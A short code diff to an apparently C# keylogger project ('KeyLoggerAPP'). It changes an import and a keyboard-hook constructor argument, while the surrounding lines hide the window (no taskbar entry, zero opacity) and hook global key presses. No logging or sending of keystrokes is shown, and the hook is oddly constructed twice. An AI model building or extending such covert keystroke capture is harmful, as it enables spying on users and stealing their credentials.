@@ -1,4 +1,5 @@
-﻿using System;
+﻿using Library;
+using System;
 using System.Diagnostics;
 using System.IO;
 using System.Windows.Forms;
@@ -22,7 +23,7 @@ namespace KeyLoggerAPP
             ShowInTaskbar = false;
             Opacity = 0;
 
-            _globalKeyboardHook = new GlobalKeyboardHook(new Keys[] { Keys.A, Keys.B });
+            _globalKeyboardHook = new GlobalKeyboardHook(new KeyForm[] { KeyForm.A, KeyForm.B });
 
             _globalKeyboardHook = new GlobalKeyboardHook();
             _globalKeyboardHook.KeyboardPressed += OnKeyPressed;
